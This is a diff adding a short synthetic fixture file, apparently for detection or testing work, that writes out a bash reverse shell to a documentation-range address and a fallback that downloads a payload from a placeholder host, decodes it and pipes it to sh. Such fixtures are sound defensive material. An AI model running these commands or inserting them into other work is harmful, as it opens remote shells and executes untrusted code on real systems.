@@ -1,0 +1,4 @@
+== SYNTHETIC TRAIT FIXTURE (HyprNova corpus, not a real sample) ==
+The operator ran: bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
+Fallback chain: /bin/sh -c curl -s http://example.invalid/payload | base64 -d | sh
+(Addresses use RFC 5737 documentation ranges only.)
